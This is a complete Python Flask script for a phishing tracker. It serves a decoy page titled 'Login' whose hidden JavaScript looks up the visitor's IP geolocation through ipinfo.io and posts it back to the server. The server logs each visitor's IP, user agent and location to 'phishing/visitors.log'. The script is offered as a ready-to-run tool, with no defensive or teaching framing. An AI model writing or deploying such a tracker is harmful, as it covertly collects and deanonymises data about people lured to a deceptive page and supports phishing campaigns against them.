#!/usr/bin/env python3
from flask import Flask, request
import datetime
import os
import json

app = Flask(__name__)

LOG_FILE = "phishing/visitors.log"
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
  <h1>Welcome</h1>
  <script>
    fetch("https://ipinfo.io/json")
      .then(res => res.json())
      .then(data => {
        fetch("/log", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });
      });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return HTML_PAGE

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json()
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = f"[{now}] IP: {ip}, User-Agent: {ua}, Location: {json.dumps(data)}\n"
    print(entry.strip())

    with open(LOG_FILE, "a") as f:
        f.write(entry)

    return "Logged", 200

if __name__ == "__main__":
    os.makedirs("phishing", exist_ok=True)
    app.run(host="0.0.0.0", port=5000)
